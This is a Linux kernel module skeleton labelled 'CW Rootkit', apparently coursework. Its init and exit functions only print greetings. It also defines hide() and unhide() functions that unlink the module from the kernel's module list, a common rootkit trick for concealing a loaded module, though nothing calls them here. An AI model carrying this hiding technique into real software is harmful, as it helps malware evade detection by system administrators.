#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Finn_Adam_Charlie");
MODULE_DESCRIPTION("CW Rootkit");
MODULE_VERSION("0.0.1");

struct list_head *module_list;

static int __init lkm_example_init(void) {

    printk(KERN_INFO "Hello, World!\n");
    return 0;
}

static void __exit lkm_example_exit(void) {
    printk(KERN_INFO "Goodbye, World!\n");
}

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
